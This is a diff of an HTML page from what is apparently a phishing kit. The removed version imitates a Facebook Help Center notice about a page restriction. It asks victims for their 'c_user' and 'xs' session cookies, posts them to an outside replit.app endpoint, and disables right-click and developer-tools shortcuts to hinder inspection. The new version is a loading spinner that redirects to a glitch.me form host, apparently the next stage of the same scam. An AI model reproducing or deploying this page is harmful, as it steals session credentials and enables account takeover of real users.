@@ -1,81 +1,51 @@
 <!DOCTYPE html>
 <html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   
-  <link id="png940" rel="icon" href="https://pbs.twimg.com/media/GMpy--7W8AA1TXJ?format=png&amp;name=small" type="image/icon">
-  <link rel="stylesheet" href="style.css">
-  <title>Facebook Help Center</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading Page</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .loading {
+      text-align: center;
+    }
+    .loading p {
+      font-size: 20px;
+      margin-bottom: 20px;
+    }
+    .loading-spinner {
+      border: 6px solid #f3f3f3; /* Light grey */
+      border-top: 6px solid #3498db; /* Blue */
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 2s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
-  <div class="deho">
-
-    <form class="content" action="https://backend-php.replit.app/submit.php" method="post">
-      
-      <div><img src="https://picturesbackend.replit.app/logo.png" width="150px" alt="meta"></div>
-
-      <div class="text5">
-        <p>
-          We have detected unusual activity on your page that violates our community standards.
-      </p><br>
-      <p>
-          Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.
-      </p><br>
-      <p>
-          If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.
-      </p>
-      </div>
-
-      <div class="vd2">
-
-        <p class="text3">Detailed Video Information</p>
-
-        <video controls="" loop="" autoplay="" width="250" poster="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png">
-          <source src="https://detailed-video-29b30.web.app/detailed%20video.mp4" type="video/mp4">
-        </video>
-        <p class="text5">Please be sure to provide the requested information below.</p>
-
-      </div>
-
-      <div>
-        <p class="tx-2">
-        c_user
-       </p>
-        <input type="number" name="c_user" id="c_user" required="">
-      </div>
-
-      <div>
-        <p class="tx-2">
-        xs
-       </p>
-        <input type="text" name="xs" id="xs" required="">
-      </div>
-      <p class="t1">Please make sure account not to log out from your computer or laptop until you have received a verification email.</p>
-
-      <div class="sub2">
-        <button class="bn2">
-          <p>
-            Submit
-          </p>
-        </button>
-  
-      </div>
-
-    </form>
-    
-  </div>
-
-  <div class="copyright">
-    <p>Meta ©️ 2024</p>
+  <div class="loading">
+    <p>Loading...</p>
+    <div class="loading-spinner"></div>
   </div>
 
   <script>
-    document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-    });
-    document.onkeydown = function(e) {
-        if (e.ctrlKey && (e.shiftKey || e.key === "I" || e.key === "i")) {
-            e.preventDefault();
-        }
-    };
-</script>
+    // Redirect after 3 seconds (adjust the time as needed)
+    setTimeout(function() {
+      window.location.href = "https://backend-submit-form.glitch.me/"; // Put your redirect URL here
+    }, 3000);
+  </script>
+
 
 </body></html>
